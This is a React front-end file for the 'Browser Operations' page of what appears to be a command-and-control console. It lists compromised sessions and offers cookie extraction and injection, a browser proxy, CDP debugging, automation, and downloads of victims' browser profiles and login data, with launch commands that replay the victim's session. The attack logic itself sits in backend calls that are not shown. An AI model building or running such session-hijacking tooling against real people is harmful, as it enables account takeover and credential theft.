import { useState, useCallback } from 'react'
import { useQuery } from '@tanstack/react-query'
import { sessionsApi, browserOpsApi, getApiErrorMessage } from '@/services/api'
import { Button } from '@/components/ui/button'
import { useToast } from '@/components/ui/use-toast'
import {
  Globe,
  Monitor,
  RefreshCw,
  Cookie,
  Wifi,
  Bug,
  FolderDown,
  Play,
  Loader2,
  ClipboardCopy,
  Download,
} from 'lucide-react'
import { cn } from '@/lib/utils'
import { CookieExtractor } from '@/components/browser/CookieExtractor'
import { CookieTable } from '@/components/browser/CookieTable'
import { CookieInjector } from '@/components/browser/CookieInjector'
import { BrowserProxy } from '@/components/browser/BrowserProxy'
import { CDPConnect } from '@/components/browser/CDPConnect'
import { AutomationPanel } from '@/components/browser/AutomationPanel'

type TabType = 'cookies' | 'proxy' | 'cdp' | 'profile' | 'automation'

const tabs = [
  { id: 'cookies' as const, label: 'Cookies', icon: Cookie },
  { id: 'proxy' as const, label: 'Proxy', icon: Wifi },
  { id: 'cdp' as const, label: 'CDP Debug', icon: Bug },
  { id: 'profile' as const, label: 'Profile', icon: FolderDown },
  { id: 'automation' as const, label: 'Automation', icon: Play },
]

export function BrowserOps() {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const [selectedSession, setSelectedSession] = useState<any>(null)
  const [activeTab, setActiveTab] = useState<TabType>('cookies')
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const [extractedCookies, setExtractedCookies] = useState<any[]>([])
  const [selectedCookieIds, setSelectedCookieIds] = useState<number[]>([])

  const handleSelectionChange = useCallback((ids: number[]) => {
    setSelectedCookieIds(ids)
  }, [])

  // Fetch sessions list
  const { data: sessionsData, isLoading: sessionsLoading, refetch } = useQuery({
    queryKey: ['sessions'],
    queryFn: sessionsApi.list,
    refetchInterval: 15000,
  })

  // Fetch stored cookies for selected session
  const {
    data: storedCookies,
    refetch: refetchCookies,
  } = useQuery({
    queryKey: ['browser-cookies', selectedSession?.id],
    queryFn: () => browserOpsApi.getCookies({ session_id: selectedSession?.id }),
    enabled: !!selectedSession?.id,
  })

  // Fetch browser info for selected session
  const { data: browserInfo, isLoading: browserInfoLoading } = useQuery({
    queryKey: ['browser-info', selectedSession?.id],
    queryFn: () => browserOpsApi.getBrowserInfo(selectedSession?.id),
    enabled: !!selectedSession?.id,
  })

  const sessions = sessionsData?.sessions || []
  const cookies = storedCookies?.cookies || extractedCookies

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const handleExtracted = (newCookies: any[]) => {
    setExtractedCookies(newCookies)
    refetchCookies()
  }

  const getOSIcon = (os: string) => {
    const lower = os?.toLowerCase() || ''
    if (lower.includes('windows')) return '🪟'
    if (lower.includes('linux')) return '🐧'
    if (lower.includes('darwin') || lower.includes('mac')) return '🍎'
    return '💻'
  }

  return (
    <div className="h-full flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between mb-4">
        <div>
          <h1 className="text-3xl font-bold flex items-center gap-3">
            <Globe className="h-8 w-8" />
            Browser Operations
          </h1>
          <p className="text-muted-foreground mt-1">
            Cookie extraction, browser proxy, and CDP debugging
          </p>
        </div>
        <Button variant="outline" size="sm" onClick={() => refetch()}>
          <RefreshCw className="h-4 w-4 mr-2" />
          Refresh
        </Button>
      </div>

      {/* Two-column layout */}
      <div className="flex-1 flex gap-4 min-h-0">
        {/* Left column: Session selector */}
        <div className="w-72 flex-shrink-0 flex flex-col border rounded-lg bg-card">
          {/* List header */}
          <div className="p-3 border-b">
            <div className="flex items-center gap-2">
              <Monitor className="h-5 w-5" />
              <span className="font-medium">Sessions</span>
              <span className="ml-auto text-sm text-muted-foreground">
                {sessions.length}
              </span>
            </div>
          </div>

          {/* Session list */}
          <div className="flex-1 overflow-auto">
            {sessionsLoading ? (
              <div className="flex items-center justify-center py-8">
                <Loader2 className="h-5 w-5 animate-spin text-muted-foreground" />
              </div>
            ) : sessions.length === 0 ? (
              <div className="text-center py-8 text-muted-foreground">
                <Monitor className="h-8 w-8 mx-auto mb-2 opacity-30" />
                <p className="text-sm">No active sessions</p>
              </div>
            ) : (
              <div className="divide-y">
                {/* eslint-disable-next-line @typescript-eslint/no-explicit-any */}
                {sessions.map((session: any) => (
                  <button
                    key={session.id}
                    onClick={() => {
                      setSelectedSession(session)
                      setActiveTab('cookies')
                      setExtractedCookies([])
                    }}
                    className={cn(
                      'w-full text-left p-3 transition-colors hover:bg-muted/50',
                      selectedSession?.id === session.id && 'bg-primary/10'
                    )}
                  >
                    <div className="flex items-center gap-2">
                      <span className="text-sm">{getOSIcon(session.os)}</span>
                      <div className="min-w-0 flex-1">
                        <p className="text-sm font-medium truncate">
                          {session.hostname}
                        </p>
                        <p className="text-xs text-muted-foreground truncate">
                          {session.username} &middot; {session.os}
                        </p>
                      </div>
                      <div className="h-2 w-2 rounded-full bg-green-500 shrink-0" />
                    </div>
                  </button>
                ))}
              </div>
            )}
          </div>

          {/* Browser info for selected session */}
          {selectedSession && browserInfo && (
            <div className="border-t p-3">
              <p className="text-xs font-medium text-muted-foreground mb-2">
                Detected Browsers
              </p>
              {browserInfoLoading ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : browserInfo.browsers?.length > 0 ? (
                <div className="space-y-1">
                  {/* eslint-disable-next-line @typescript-eslint/no-explicit-any */}
                  {browserInfo.browsers.map((b: any, i: number) => (
                    <div
                      key={i}
                      className="flex items-center gap-2 text-xs"
                    >
                      <div
                        className={cn(
                          'h-1.5 w-1.5 rounded-full',
                          b.running ? 'bg-green-500' : 'bg-gray-400'
                        )}
                      />
                      <span>{b.name}</span>
                      {b.running && (
                        <span className="text-muted-foreground">(PID {b.pid})</span>
                      )}
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-xs text-muted-foreground">No browsers detected</p>
              )}
            </div>
          )}
        </div>

        {/* Right column: Tabbed content */}
        <div className="flex-1 flex flex-col min-w-0 border rounded-lg bg-card overflow-hidden">
          {selectedSession ? (
            <>
              {/* Session header */}
              <div className="flex items-center gap-4 p-4 border-b bg-muted/30">
                <span className="text-lg">{getOSIcon(selectedSession.os)}</span>
                <div className="min-w-0 flex-1">
                  <h2 className="font-semibold truncate">
                    {selectedSession.hostname}
                  </h2>
                  <p className="text-sm text-muted-foreground truncate">
                    {selectedSession.username} &middot; {selectedSession.remote_address}
                  </p>
                </div>
              </div>

              {/* Tab navigation */}
              <div className="flex border-b">
                {tabs.map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={cn(
                      'flex items-center gap-2 px-4 py-3 text-sm font-medium transition-colors border-b-2 -mb-px',
                      activeTab === tab.id
                        ? 'border-primary text-primary'
                        : 'border-transparent text-muted-foreground hover:text-foreground'
                    )}
                  >
                    <tab.icon className="h-4 w-4" />
                    {tab.label}
                  </button>
                ))}
              </div>

              {/* Tab content */}
              <div className="flex-1 overflow-auto p-4">
                {activeTab === 'cookies' && (
                  <div className="space-y-4">
                    <CookieExtractor
                      sessionId={selectedSession.id}
                      onExtracted={handleExtracted}
                    />
                    <CookieTable
                      cookies={cookies}
                      sessionId={selectedSession.id}
                      onDelete={() => refetchCookies()}
                      onSelectionChange={handleSelectionChange}
                    />
                    {selectedCookieIds.length > 0 && (
                      <CookieInjector
                        selectedCookieIds={selectedCookieIds}
                        sessionId={selectedSession.id}
                      />
                    )}
                  </div>
                )}

                {activeTab === 'proxy' && (
                  <BrowserProxy
                    key={`proxy-${selectedSession.id}`}
                    sessionId={selectedSession.id}
                  />
                )}

                {activeTab === 'cdp' && (
                  <CDPConnect
                    key={`cdp-${selectedSession.id}`}
                    sessionId={selectedSession.id}
                  />
                )}

                {activeTab === 'profile' && (
                  <ProfileTab
                    sessionId={selectedSession.id}
                    browserInfo={browserInfo}
                  />
                )}

                {activeTab === 'automation' && (
                  <AutomationPanel
                    key={`auto-${selectedSession.id}`}
                    selectedCookieIds={selectedCookieIds}
                    sessionId={selectedSession.id}
                  />
                )}
              </div>
            </>
          ) : (
            <div className="flex-1 flex items-center justify-center">
              <div className="text-center">
                <Globe className="h-16 w-16 mx-auto text-muted-foreground/30 mb-4" />
                <p className="text-lg font-medium">No Session Selected</p>
                <p className="text-sm text-muted-foreground mt-1">
                  Select a session from the list to start browser operations
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

// ═══════════════════════════════════════════════════════════════════════════
// Profile Tab (inline component)
// ═══════════════════════════════════════════════════════════════════════════

function ProfileTab({
  sessionId,
  browserInfo,
}: {
  sessionId: string
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  browserInfo: any
}) {
  const [downloadingBrowser, setDownloadingBrowser] = useState<string | null>(null)
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const [downloadResult, setDownloadResult] = useState<any>(null)
  const { toast } = useToast()

  const handleDownload = async (browser: string) => {
    setDownloadingBrowser(browser)
    setDownloadResult(null)
    try {
      const result = await browserOpsApi.downloadProfile({
        session_id: sessionId,
        browser,
      })
      setDownloadResult(result)
      toast({
        title: 'Profile downloaded',
        description: `${result.files?.length || 0} files from ${browser}`,
      })
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    } catch (error: any) {
      toast({
        variant: 'destructive',
        title: 'Download failed',
        description: getApiErrorMessage(error, 'Failed to download profile'),
      })
    } finally {
      setDownloadingBrowser(null)
    }
  }

  const copyToClipboard = async (text: string, label: string) => {
    try {
      await navigator.clipboard.writeText(text)
      toast({ title: `${label} copied to clipboard` })
    } catch {
      toast({ variant: 'destructive', title: 'Failed to copy' })
    }
  }

  const browsers = browserInfo?.browsers || []

  return (
    <div className="space-y-4">
      <div>
        <h3 className="font-medium mb-1">Browser Profile Download</h3>
        <p className="text-sm text-muted-foreground">
          Download cookie databases, login data, and other profile files for offline analysis.
        </p>
      </div>

      {browsers.length > 0 ? (
        <div className="grid gap-3">
          {/* eslint-disable-next-line @typescript-eslint/no-explicit-any */}
          {browsers.map((b: any, i: number) => {
            const isDownloading = downloadingBrowser === b.browser_type
            return (
              <div
                key={i}
                className="flex items-center justify-between p-4 border rounded-lg"
              >
                <div>
                  <p className="font-medium">{b.name}</p>
                  <p className="text-sm text-muted-foreground">
                    {b.running ? 'Running' : 'Not running'} &middot;{' '}
                    {b.profiles?.join(', ') || 'Default'}
                  </p>
                  {b.cookie_path && (
                    <p className="text-xs text-muted-foreground font-mono mt-1">
                      {b.cookie_path}
                    </p>
                  )}
                </div>
                <div className="flex items-center gap-2">
                  <Button
                    size="sm"
                    onClick={() => handleDownload(b.browser_type)}
                    disabled={downloadingBrowser !== null}
                  >
                    {isDownloading ? (
                      <Loader2 className="h-4 w-4 animate-spin mr-2" />
                    ) : (
                      <FolderDown className="h-4 w-4 mr-2" />
                    )}
                    {isDownloading ? 'Downloading...' : 'Download'}
                  </Button>
                </div>
              </div>
            )
          })}
        </div>
      ) : (
        <div className="text-center py-8 text-muted-foreground">
          <FolderDown className="h-12 w-12 mx-auto mb-3 opacity-30" />
          <p>No browsers detected on target</p>
          <p className="text-sm mt-1">
            Select a session and wait for browser detection to complete
          </p>
        </div>
      )}

      {/* Profile Launch section - shown after download */}
      {downloadResult && downloadResult.launch_commands && (
        <div className="space-y-4 border-t pt-4">
          <div>
            <h3 className="font-medium mb-1">Launch Browser with Profile</h3>
            <p className="text-sm text-muted-foreground">
              Use these commands on your local machine to launch a browser with the victim&apos;s session.
            </p>
          </div>

          {/* ZIP download */}
          {downloadResult.zip_url && (
            <div>
              <a
                href={downloadResult.zip_url}
                download
                className="inline-flex items-center gap-2 px-4 py-2 rounded-md bg-primary text-primary-foreground text-sm font-medium hover:bg-primary/90"
              >
                <Download className="h-4 w-4" />
                Download Profile as ZIP
              </a>
            </div>
          )}

          {/* Launch commands */}
          <div className="space-y-3">
            {Object.entries(downloadResult.launch_commands as Record<string, string>).map(
              ([os, cmd]) => (
                <div key={os} className="space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="text-sm font-medium capitalize">{os}</span>
                  </div>
                  <div className="relative">
                    <pre className="bg-muted rounded-md p-3 font-mono text-xs overflow-x-auto whitespace-pre-wrap break-all pr-10">
                      {cmd}
                    </pre>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="absolute right-1 top-1 h-7 w-7"
                      onClick={() => copyToClipboard(cmd, `${os} command`)}
                    >
                      <ClipboardCopy className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                </div>
              )
            )}
          </div>

          {/* Downloaded files list */}
          {downloadResult.files?.length > 0 && (
            <div>
              <p className="text-xs font-medium text-muted-foreground mb-2">
                Downloaded Files
              </p>
              <div className="space-y-1">
                {/* eslint-disable-next-line @typescript-eslint/no-explicit-any */}
                {downloadResult.files.map((f: any, i: number) => (
                  <div key={i} className="flex items-center justify-between text-xs">
                    <span className="font-mono">{f.name}</span>
                    <span className="text-muted-foreground">
                      {f.size > 1024 * 1024
                        ? `${(f.size / (1024 * 1024)).toFixed(1)} MB`
                        : f.size > 1024
                          ? `${(f.size / 1024).toFixed(1)} KB`
                          : `${f.size} B`}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  )
}
